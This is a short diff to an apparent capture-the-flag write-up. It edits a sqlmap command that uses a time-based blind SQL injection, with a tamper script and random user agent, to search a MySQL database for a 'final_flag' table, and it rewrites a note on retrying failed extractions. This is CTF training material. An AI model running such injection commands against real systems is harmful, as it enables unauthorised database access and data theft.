@@ -94,8 +94,8 @@ However we do also have this warning:
 
 Now that we've found a way in with a time-based blind SQL injection, lets enumerate the database and search for the "final_flag" table:
 
-    sqlmap --batch -r request.txt --random-agent --technique=T --dbms=MySQL --tamper=between --search -T final_flag
+    sqlmap --batch -r request.txt --random-agent --technique=T --retries=5 --dbms=MySQL --tamper=between --search -T final_flag
 
 - Note:
     - When using a time-based blind injection sqlmap extracts data by individual characters. A timeout or an unstable network can cause you obtain an incomplete or incorrect flag.
-    - It this happens, try to increase the number of retries (--retries), the delay from the DBMS response (--time-sec), or the delay between each HTTP request (--delay).
+    - It this happens, it can be beneficial to increase the number of retries when the connection timeouts (--retries).
